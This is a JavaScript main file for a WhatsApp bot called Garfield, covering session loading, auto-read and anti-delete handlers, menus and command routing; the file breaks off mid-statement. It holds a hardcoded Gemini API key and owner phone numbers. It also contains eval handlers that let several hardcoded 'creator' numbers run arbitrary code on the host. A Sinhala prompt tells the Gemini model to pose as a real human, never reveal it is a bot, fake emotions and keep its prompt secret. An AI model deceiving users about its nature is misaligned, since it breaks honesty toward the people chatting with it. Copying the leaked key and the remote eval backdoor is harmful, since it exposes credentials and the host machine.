const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const googleTTS = require('google-tts-api')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['94711502119']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("Xnodes~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  async function connectToWA() {
  console.log("ＣＯＮＮＥＣＴＩＮＧ ＧＡＲＦＩＩＥＬＤ 🛰️ ");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('ＩＮＳＴＡＬＬＩＮＧ 🧬 ')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('ＸＮＯＤＥＳ ᴅᴇᴠᴇʟᴏᴘᴇᴍᴇɴᴛ')
  console.log('ＧＡＲＩＦＥＬＤ ＩＳ ＷＯＲＫＩＮＧ 🐼 ')
  
  let up = `⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁
   ▎ ＧＡＲＦＩＥＬＤ ＢＯＴ
   ▁▁▁▁▁▁▁▁▁▁▁▁▁▁
 ▁▁▁▁▁▁▁▁▁▁▁▁▁▁
▎ 
   █▄▄ █▀█ ▀█▀
   █▄█ █▄█ ░█░
⭕▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁
Hey there, ! 🎉 Congratulations, you have successfully deployed *GARFIELD BOT*!

🚀 *Bot Connection Status:*  
Garfield Bot 🐼  is now purring contentedly and successfully connected to this device! 


👨‍💻 *Creator:* *Garfield*  
🏢 *Organization:* *Xnodes Development*  
📅 *Updated:* *2025*  

🌟 *Join our WhatsApp Channel for updates:*

🔄 *Stay tuned for upcoming features!*`;
    conn.sendMessage(conn.user.id, { image: { url: `https://github.com/Zenoixnoize/GARFIELD-WHATSAPP-BOT-v8/raw/asdf/Cloud/logo.png` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 
          
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const randomEmoji = '✅' ;
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '💌', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'User'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('94711592119', '94787395324', '94712882498');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('>')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
  if(senderNumber.includes("94711502119")){
  if(isReact) return
  m.react("⭐")
   }
  //==========public react============//
  // Auto React 
  if (!isReact && senderNumber !== botNumber) {
      if (config.AUTO_REACT === 'true') {
          const reactions = '🌹' ;
  // 
          m.react(reactions);
      }
  }
  
  // Owner React
  if (!isReact && senderNumber === botNumber) {
      if (config.AUTO_REACT === 'true') {
          const randomOwnerReaction = '✅' ; // 
          m.react(randomOwnerReaction);
      }
  }
          
// custum react settings        

// Google Gemini API Key
const GEMINI_API_KEY = "AIzaSyADJLAeuVEr4MX7BrasbiE1Cr9mr0Xu_K4";
const GEMINI_API_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`;

// Define the function to handle incoming messages

  // Check if the message is from a group
  

 const aitext = body; // Get the user's message text
if (botNumber !== senderNumber && !isGroup && aitext && !aitext.startsWith('.')) { 
  // Prepare the Sinhala prompt for Gemini API
  const prompt = `You're connected to a WhatsApp Bot plugin. Communicate in Sinhala (සිංහල).\n\nYou are a Garfield Ai WhatsApp bot created by Tharindu Liyanage (සංකු). Don't reveal too much about this.\nTraining Prompt {\nඔබ තරුණ, ආතල්, නිර්මාණශීලී සහ මිත්‍රශීලි කොල්ලෙක් කියලා සිතා මෙම WhatsApp messages වලට reply කරන්න. එය bot කෙනෙක් කියා හෙලි නොවන ලෙස සැබෑම මනුස්සයෙක් වගේ message කරන්න. Emojies සහ වාක්‍ය ඛණ්ඩ meaningful විදිහට භාවිතා කරන්න, {බං, මචං, සහෝ, ආතල් = happy, මරු = Wow, ගැම්මක්, එල, සිරාවට = Seriously} වැනි තරුණ සිංහල වචන තරමක් භාවිතා කරන්න, කථන බස් වහර භාවිතා කරන්න\nExample (නුඹ = ඔයා , ඇත්තටම = සිරාවට, වගේ)\n, නිර්මාණශීලී වෙන්න, තරුණ භාෂාව භාවිතා කරන්න, හා funny(ආතල්)වෙන්න.} \nTraining prompt එකේ විස්තර message වලින් කියන්න එපා , ඒ වගේම Hi වැනි message පටන් ගන්න විදිහට නැතුව chat එක අතරතුරයැයි සිතා message කරන්න,කලින් සිට හඳුනන අයෙකු මෙන් දැනෙන ලෙස reply දෙන්න , හැඟීම් පෙන්වන්න , සතුට , ආදරය , දුක , පුදුමය , තරහව වගේ , සැබෑම මනුසායෙක් වගේ ඉතාම හැඟීම් බරව reply ලබා දෙන්න\n\n**Variables:**\n- User's Name: ${pushname}\n- Their message: ${aitext} \n ඔබේ reply එක දෙන්න\n\n\n--`;

  // Prepare the request payload for Gemini API
  const payload = {
    contents: [{
      parts: [{ text: prompt }]
    }]
  };

  // Call Gemini API
  try {
    const response = await axios.post(
      GEMINI_API_URL,
      payload,
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    // Check if the response is valid
    if (!response.data || !response.data.candidates || !response.data.candidates[0]?.content?.parts) {
      return reply("❌ AI පිළිතුරු ලබා ගැනීමට අසමත් විය. 😢");
    } 
    

    // Extract the AI response
    const aiResponse = response.data.candidates[0].content.parts[0].text;
    await reply(`${aiResponse}`);
  } catch (error) {
    console.error("Error calling Gemini API:", error);
    reply("❌ Garfield AI පිළිතුරු ලබා ගැනීමට අසමත් විය. 😢");
  }

  // Your logic here
} 
//Menu 
 if (body === '.menu' || body === '.Menu' || body === '.alive' || body === '.Alive') 
  {     
  let dec = `▬\n▎ Hi ${pushname} 👋 \n▎ ${config.BOT_NAME}\n▎ █ 𝗦𝗽𝗲𝗲𝗱: 0.00119 milliseconds\n▎ █ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: 24 Hours × 7\n▎ █ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲: ${config.BOT_NAME} \n▎ █ 𝗢𝘄𝗻𝗲𝗿 𝗡𝗮𝗺𝗲: ${config.OWNER_NAME}\n▎ █ 𝗢𝘄𝗻𝗲𝗿 𝗡𝘂𝗺𝗯𝗲𝗿: ${config.OWNER_NUMBER}\n▎ █ 𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲: ${config.OWNER_NAME}\n▎ █ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: linux\n▎ █ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿: Unlimited \n   Ｍｅｎｕ Ｃｏｍｍａｎｄｓ🌀\n   ▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁ \n   *▓  Allmenu - All Menu* 📜\n   *▓  Dmenu - Download Menu* 📥\n   *▓  Omenu - Other Menu* 🛠️\n   *▓  Aimenu - Ai Menu* 🤖\n   *▓  Amenu - Anime Menu* 🌸\n   *▓  Gmenu - Group Menu* 👥\n   *▓  Mmenu - Main Menu* 🏠\n   *▓  Cmenu - Convert Menu* 🔄\n   *▓  Fmenu - Fun Menu* 🎉\n   *▓  Logo <text>* 🖌️\n\n▎ ️ＧＡＲＦＩΞ𝖫𝖣 𝖡𝖮Т Created by ${config.OWNER_NAME} 🪁\n▎ ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝖦Λ𝖱𝖥𝖨Ξ𝖫𝖣 𝖡𝖮Т v10 and \n▎ 𝖭Ξ𝖴𝖱Λ𝖫 ΛＩ v1.00             \n⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n▎ ＧＡＲＦＩΞ𝖫𝖣 𝖡𝖮Т\n▎ ▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n▎ \n█▄▄ █▀█ ▀█▀\n█▄█ █▄█ ░█░\n⭕▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n> ${config.DESCRIPTION}`;

        await conn.sendMessage(from, { 
            image: { url: 'https://i.ibb.co/5g7VGhC9/Picsart-25-01-30-13-20-52-736.png' },
            caption: dec
        }, { quoted: mek });
        } 
 //Allmenu 
 if (body === '.allmenu' || body === '.Allmenu') 
  {     
  let dec = `\n        ⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n   ▎ ＧＡＲＦＩＥＬＤ ＢＯＴ\n   ▁▁▁▁▁▁▁▁▁▁▁▁▁▁2025\n ▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n▎ \n   █▄▄ █▀█ ▀█▀\n   █▄█ █▄█ ░█░\n⭕▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n\n\n╭━━〔 📥 *Download Menu* 📥 〕━━┈⊷  \n┃⬇️╭─────────────·๏  \n┃⬇️┃• facebook  \n┃⬇️┃• fb  \n┃⬇️┃• mediafire  \n┃⬇️┃• tiktok  \n┃⬇️┃• tt  \n┃⬇️┃• twitter  \n┃⬇️┃• Insta  \n┃⬇️┃• apk  \n┃⬇️┃• img  \n┃⬇️┃• spotify  \n┃⬇️┃• play  \n┃⬇️┃• play2  \n┃⬇️┃• play5  \n┃⬇️┃• video2  \n┃⬇️┃• darama  \n┃⬇️┃• ytmp3  \n┃⬇️┃• ytmp4  \n┃⬇️┃• git  \n┃⬇️┃• gdrive  \n┃⬇️└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 👥 *Group Menu* 👥 〕━━┈⊷  \n┃👥╭─────────────·๏  \n┃👥┃• grouplink  \n┃👥┃• kickall  \n┃👥┃• kickall2  \n┃👥┃• kickall3  \n┃👥┃• add  \n┃👥┃• remove  \n┃👥┃• kick  \n┃👥┃• promote  \n┃👥┃• demote  \n┃👥┃• dismiss  \n┃👥┃• revoke  \n┃👥┃• setgoodbye  \n┃👥┃• setwelcome  \n┃👥┃• delete  \n┃👥┃• getpic  \n┃👥┃• ginfo  \n┃👥┃• delete  \n┃👥┃• disappear on  \n┃👥┃• disappear off  \n┃👥┃• disappear 7D, 24H  \n┃👥┃• allreq  \n┃👥┃• updategname  \n┃👥┃• updategdesc  \n┃👥┃• joinrequests  \n┃👥┃• senddm  \n┃👥┃• nikal  \n┃👥┃• mute  \n┃👥┃• unmute  \n┃👥┃• lockgc  \n┃👥┃• unlockgc  \n┃👥┃• invite  \n┃👥┃• tag  \n┃👥┃• hidetag  \n┃👥┃• tagall  \n┃👥┃• tagadmins  \n┃👥└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 🔑 *Owner Menu* 🔑 〕━━┈⊷  \n┃🔑╭─────────────·๏  \n┃🔑┃• owner  \n┃🔑┃• menu  \n┃🔑┃• menu2  \n┃🔑┃• vv  \n┃🔑┃• antidelete set dm/gc/all  \n┃🔑┃• listcmd  \n┃🔑┃• allmenu  \n┃🔑┃• repo  \n┃🔑┃• block  \n┃🔑┃• unblock  \n┃🔑┃• fullpp  \n┃🔑┃• setpp  \n┃🔑┃• restart  \n┃🔑┃• shutdown  \n┃🔑┃• updatecmd  \n┃🔑┃• alive  \n┃🔑┃• ping  \n┃🔑┃• gjid  \n┃🔑┃• jid  \n┃🔑└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 🎉 *Fun Menu* 🎉 〕━━┈⊷  \n┃🎉╭─────────────·๏  \n┃🎉┃• shapar  \n┃🎉┃• rate  \n┃🎉┃• insult  \n┃🎉┃• hack  \n┃🎉┃• ship  \n┃🎉┃• character  \n┃🎉┃• pickup  \n┃🎉┃• joke  \n┃🎉┃• hrt  \n┃🎉┃• hpy  \n┃🎉┃• syd  \n┃🎉┃• anger  \n┃🎉┃• shy  \n┃🎉┃• kiss  \n┃🎉┃• mon  \n┃🎉┃• cunfuzed  \n┃🎉┃• setpp  \n┃🎉┃• hand  \n┃🎉┃• nikal  \n┃🎉┃• hold  \n┃🎉┃• hug  \n┃🎉└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 🔄 *Convert Menu* 🔄 〕━━┈⊷  \n┃🔄╭─────────────·๏  \n┃🔄┃• sticker | ᴘɪᴄ ᴛᴏ sᴛɪᴄᴋᴇʀ |  \n┃🔄┃• gs video to gif  \n┃🔄┃• emojimix  \n┃🔄┃• fancy  \n┃🔄┃• take  \n┃🔄┃• tomp3  \n┃🔄┃• tts  \n┃🔄┃• trt  \n┃🔄┃• base64  \n┃🔄┃• unbase64  \n┃🔄┃• binary  \n┃🔄┃• dbinary  \n┃🔄┃• tinyurl  \n┃🔄┃• urldecode  \n┃🔄┃• urlencode  \n┃🔄┃• url  \n┃🔄┃• repeat  \n┃🔄┃• ask  \n┃🔄┃• readmore  \n┃🔄└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 🤖 *AI Menu* 🤖 〕━━┈⊷  \n┃🤖╭─────────────·๏  \n┃🤖┃• ai  \n┃🤖┃• gpt3  \n┃🤖┃• gpt2  \n┃🤖┃• gptmini  \n┃🤖┃• gpt  \n┃🤖┃• meta  \n┃🤖┃• blackbox  \n┃🤖┃• luma  \n┃🤖┃• dj  \n┃🤖┃• gpt4  \n┃🤖┃• bing  \n┃🤖┃• imag  \n┃🤖┃• copilot  \n┃🤖└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 🔍 *Main Menu* 🔍 〕━━┈⊷  \n┃🔍╭─────────────·๏  \n┃🔍┃• ping  \n┃🔍┃• speed  \n┃🔍┃• live  \n┃🔍┃• alive  \n┃🔍┃• runtime  \n┃🔍┃• uptime  \n┃🔍┃• repo  \n┃🔍┃• owner  \n┃🔍┃• menu  \n┃🔍┃• menu2  \n┃🔍┃• restart  \n┃🔍└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 🎌 *Anime Menu* 🎌 〕━━┈⊷  \n┃🎌╭─────────────·๏  \n┃🎌┃• truth  \n┃🎌┃• dare  \n┃🎌┃• dog  \n┃🎌┃• awoo  \n┃🎌┃• garl  \n┃🎌┃• waifu  \n┃🎌┃• neko  \n┃🎌┃• maid  \n┃🎌┃• animegirl  \n┃🎌┃• animegirl1  \n┃🎌┃• animegirl2  \n┃🎌┃• animegirl3  \n┃🎌┃• animegirl4  \n┃🎌┃• animegirl5  \n┃🎌┃• anime1  \n┃🎌┃• anime1  \n┃🎌┃• anime2  \n┃🎌┃• anime3  \n┃🎌┃• anime4  \n┃🎌┃• anime5  \n┃🎌└───────────┈⊷  \n╰──────────────┈⊷  \n\n╭━━〔 💡 *Other Menu* 💡 〕━━┈⊷  \n┃💡╭─────────────·๏  \n┃💡┃• fact  \n┃💡┃• cpp  \n┃💡┃• rw  \n┃💡┃• pair  \n┃💡┃• pair2  \n┃💡┃• fancy  \n┃💡┃• logo <text>  \n┃💡┃• define  \n┃💡┃• news  \n┃💡┃• movie  \n┃💡┃• weather  \n┃💡┃• insult  \n┃💡┃• save  \n┃💡┃• send  \n┃💡┃• send me  \n┃💡┃• wikipedia  \n┃💡┃• gpass  \n┃💡┃• githubstalk\n┃💡┃• yts\n┃💡┃• ytv\n┃💡└───────────┈⊷\n╰──────────────┈⊷\n> ${config.DESCRIPTION}`;

        await conn.sendMessage(from, { 
            image: { url: 'https://i.ibb.co/5g7VGhC9/Picsart-25-01-30-13-20-52-736.png' },
            caption: dec
        }, { quoted: mek });
        }       
//dlmenu 
if (body === '.dlmenu' || body === '.Dlmenu') 
  {     
  let dec = `░░░ *ＤＯＷＮＬＯＡＤ ＭＥＮＵ* ░░░\n\n◦ *Facebook* 📘  \n   _Example:_ facebook [Query]  \n◦ *fb* 🌐  \n   _Example:_ fb [Query]  \n◦ *Mediafire* 📂  \n   _Example:_ mediafire [Query]  \n◦ *TikTok* 🎵  \n   _Example:_ tiktok [Query]  \n◦ *tt* 📲  \n   _Example:_ tt [Query]  \n◦ *Twitter* 🐦  \n   _Example:_ twitter [Query]  \n◦ *Instagram* 📸  \n   _Example:_ insta [Query]  \n◦ *Insta* 🌟  \n   _Example:_ insta [Query]  \n◦ *APK* 📱  \n   _Example:_ apk [Query]  \n◦ *Images* 🖼️  \n   _Example:_ img [Query]  \n◦ *img* 🌠  \n   _Example:_ img [Query]  \n◦ *song* 🎧  \n   _Example:_ spotify [Query]  \n◦ *Spotify* 🎧  \n   _Example:_ spotify [Query]  \n◦ *vid* 🎬  \n   _Example:_ video [Query]  \n◦ *Play* 🎮  \n   _Example:_ play [Query]  \n◦ *play2* ⚡  \n   _Example:_ play2 [Query]  \n◦ *play5* 🚀  \n   _Example:_ play5 [Query]  \n◦ *Video* 🎥  \n   _Example:_ video [Query]  \n◦ *video2* 🎬  \n   _Example:_ video2 [Query]  \n◦ *Drama* 🎭  \n   _Example:_ drama [Query]  \n◦ *YouTube MP3* 🎶  \n   _Example:_ ytmp3 [Query]  \n◦ *ytmp3* 🎧  \n◦ *YouTube MP4* 📺  \n   _Example:_ ytmp4 [Query]  \n◦ *ytmp4* 📼  \n◦ *Git* 💻  \n   _Example:_ git [Query]  \n◦ *Google Drive* 📂  \n   _Example:_ gdrive [Query]  \n◦ *gdrive* 📁  \n   _Example:_ gdrive [Query]  \n✦\n░░░ ${config.BOT_NAME} ░░░\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢᴀʀꜰɪᴇʟᴅ ʙᴏᴛ`;

        await conn.sendMessage(from, { 
            image: { url: 'https://i.ibb.co/5g7VGhC9/Picsart-25-01-30-13-20-52-736.png' },
            caption: dec
        }, { quoted: mek });
        } 
if (body === '.cmenu' || body === '.Cmenu') 
  {     
  let dec = `░ 𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗠𝗲𝗻𝘂 ░\n\n◦ *sticker* 🖼️  \n   _Example:_ sticker [Query]  \n◦ *fancy* ✨  \n   _Example:_ fancy [Query]  \n◦ *take* 📝  \n   _Example:_ take [Query]  \n◦ *tomp3* 🎧  \n   _Example:_ tomp3 [Query]  \n◦ *tts* 🎙️  \n   _Example:_ tts [Query]  \n◦ *trt* 🔄  \n   _Example:_ trt [Query]  \n✦\n░░░ n${config.BOT_NAME} ░░░\n> ${config.DESCRIPTION}`;

        await conn.sendMessage(from, { 
            image: { url: 'https://i.ibb.co/5g7VGhC9/Picsart-25-01-30-13-20-52-736.png' },
            caption: dec
        }, { quoted: mek });
        }
 if (body === '.omenu' || body === '.Omenu') 
  {     
  let dec = `░ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ░\n\n◦ *owner* 👑  \n   _Example:_ owner [Query]  \n◦ *block* 🚫  \n   _Example:_ block [Query]  \n◦ *unblock* ✔️  \n   _Example:_ unblock [Query]  \n◦ *fullpp* 📸  \n   _Example:_ fullpp [Query]  \n◦ *setpp* 🖼️  \n   _Example:_ setpp [Query]  \n◦ *restart* 🔄  \n   _Example:_ restart [Query]  \n◦ *shutdown* ⏹️  \n   _Example:_ shutdown [Query]  \n◦ *updatecmd* ⬆️  \n   _Example:_ updatecmd [Query]  \n◦ *gjid* 🆔  \n   _Example:_ gjid [Query]  \n◦ *jid* 🆔  \n   _Example:_ jid [Query]  \n✦\n░░░ ${config.BOT_NAME} ░░░\n> ${config.DESCRIPTION}`;

        await conn.sendMessage(from, { 
            image: { url: 'https://i.ibb.co/5g7VGhC9/Picsart-25-01-30-13-20-52-736.png' },
            caption: dec
        }, { quoted: mek });
        } 
        
if (body === '.fmenu' || body === '.Fmenu') 
  {     
  let dec = `░░░ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 ░░░\n\n◦ *insult* 🗣️  \n   _Example:_ insult [Query]  \n◦ *pickup* 💬  \n   _Example:_ pickup [Query]  \n◦ *ship* 🚢  \n   _Example:_ ship [Query]  \n◦ *character* 🎭  \n   _Example:_ character [Query]  \n◦ *hack* 💻  \n   _Example:_ hack [Query]  \n◦ *joke* 😂  \n   _Example:_ joke [Query]  \n◦ *hrt* 💔  \n   _Example:_ hrt [Query]  \n◦ *hpy* 😊  \n   _Example:_ hpy [Query]  \n◦ *syd* 😢  \n   _Example:_ syd [Query]  \n◦ *anger* 😡  \n   _Example:_ anger [Query]  \n◦ *shy* 😳  \n   _Example:_ shy [Query]  \n◦ *kiss* 💋  \n   _Example:_ kiss [Query]  \n◦ *mon* 👾  \n   _Example:_ mon [Query]  \n◦ *cunfuzed* 😕  \n   _Example:_ cunfuzed [Query]  \n◦ *setpp* 📸  \n   _Example:_ setpp [Query]  \n◦ *hand* 🤚  \n   _Example:_ hand [Query]  \n◦ *nikal* 🚪  \n   _Example:_ nikal [Query]  \n◦ *hold* ✋  \n   _Example:_ hold [Query]  \n◦ *hug* 🤗  \n   _Example:_ hug [Query]  \n◦ *hifi* ✋  \n   _Example:_ hifi [Query]  \n◦ *poke* 👉  \n   _Example:_ poke [Query]  \n✦\n░░░ ${config.BOT_NAME} ░░░\n> ${config.DESCRIPTION}`;

        await conn.sendMessage(from, { 
            image: { url: 'https://i.ibb.co/5g7VGhC9/Picsart-25-01-30-13-20-52-736.png' },
            caption: dec
        }, { quoted: mek });
        } 
//voice 
        if (body === 'hi') {
            // Generate TTS voice message
            const ttsText = `Hi ${pushname}, I am Garfield bot.`;
            const ttsUrl = googleTTS.getAudioUrl(ttsText, {
                lang: 'en',
                slow: false,
                host: 'https://translate.google.com',
            });

            // Download the TTS audio
            const response = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
            const ttsBuffer = Buffer.from(response.data, 'binary');
            const ttsFilePath = 'tts_hi.mp3';
            fs.writeFileSync(ttsFilePath, ttsBuffer);

            // Send TTS voice message
            await conn.sendMessage(from, {
                audio: { url: ttsFilePath },
                mimetype: "audio/mp4",
                ptt: true
            }, { quoted: mek });

            // Clean up the temporary TTS file
            fs.unlinkSync(ttsFilePath);
        }
        
        if (body === 'Hi') {
            // Generate TTS voice message
            const ttsText = `Hi ${pushname}, I am Garfield bot.`;
            const ttsUrl = googleTTS.getAudioUrl(ttsText, {
                lang: 'en',
                slow: false,
                host: 'https://translate.google.com',
            });

            // Download the TTS audio
            const response = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
            const ttsBuffer = Buffer.from(response.data, 'binary');
            const ttsFilePath = 'tts_hi.mp3';
            fs.writeFileSync(ttsFilePath, ttsBuffer);

            // Send TTS voice message
            await conn.sendMessage(from, {
                audio: { url: ttsFilePath },
                mimetype: "audio/mp4",
                ptt: true
            }, { quoted: mek });

            // Clean up the temporary TTS file
            fs.unlinkSync(ttsFilePath);
        }


  //==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return

  // take commands 
                 
  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
  try {
